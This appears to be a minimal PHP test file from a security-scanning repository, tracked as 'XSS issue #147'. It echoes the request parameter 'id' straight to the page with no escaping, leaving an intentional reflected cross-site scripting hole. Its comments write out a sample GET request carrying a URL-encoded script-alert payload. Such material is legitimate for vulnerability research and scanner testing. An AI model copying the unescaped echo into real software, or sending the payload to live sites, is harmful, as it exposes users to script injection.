<?php
//TODO: AI XSS issue #147, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/147, 3e99849e
//AI exploit:
//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-aa79a02/vulnerable.php?id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
//Host: localhost
//Accept-Encoding: identity
//Connection: close
echo $_REQUEST['id'];

?>
